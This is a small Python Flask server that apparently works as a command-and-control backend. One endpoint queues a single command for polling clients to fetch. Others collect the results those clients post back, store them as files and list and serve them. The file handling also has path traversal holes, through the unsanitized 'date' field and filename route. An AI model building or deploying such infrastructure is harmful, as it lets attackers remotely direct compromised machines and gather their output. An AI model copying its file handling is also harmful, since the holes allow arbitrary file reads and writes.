import os
from flask import Flask, request, redirect, make_response, jsonify, Response

app = Flask(__name__)


command = "null"
logs = []

def createFile(logs):
    for log in logs:
        f = open(f"files/{log.get('date')}.txt", "w", encoding="utf-8")
        f.write(f"#{log.get('caption')}\n{log.get('body')}")
        f.close()


@app.route("/sendlogs", methods=["POST"])
def reviceLogs():
    global logs
    data = request.form
    logDict = {
        "caption": f"cmd:{data.get('command')}",
        "date": data.get("date"),
        "body": data.get("body")
    }
    logs.append(logDict)    
    print(logs)
    response = {
        "request-status": "OK"
    }
    
    createFile(logs)

    return jsonify(response)


@app.route("/logs", methods=["GET"])
def showLogs():
    try:
        logsToShow = ""
        for log in os.listdir("files/"):
            link = log
            with open(f"files/{log}", "r", encoding="utf-8") as file:
                caption = [i.split("\n")[0].split("# ")[-1] for i in file.readlines() if i[0] == "#"]
            logsToShow += f'<a href="/files/{link}">{caption[0]}</a><br>\n'
        return logsToShow
    except IndexError as e:
        return f"some erorr maaan fuck dat shit\n{e}"

@app.route("/files/<filename>", methods=["GET"])
def readFile(filename):
    with open(f"files/{filename}", 'r') as file:
        content = file.read()
        return Response(content, mimetype='text/plain')


@app.route("/listen", methods=["GET", "POST"])
def cmdListen():
    global command
    if request.method == "GET":
        data = {
            "command": command
        }
        command = "null"
        return data
    else:
        data = request.form
        command = data.get('command')
        print(f"Recived: {command}")

        status = {
            "request-status": "OK",
            "data-recived": command
        }

        return jsonify(status)


def main(a=1, b=1): # without these arguments app does not want to work on heroku host idk whats the issue lol 
    return app.run(threaded=True, port=5000)


if __name__ == '__main__':
    main()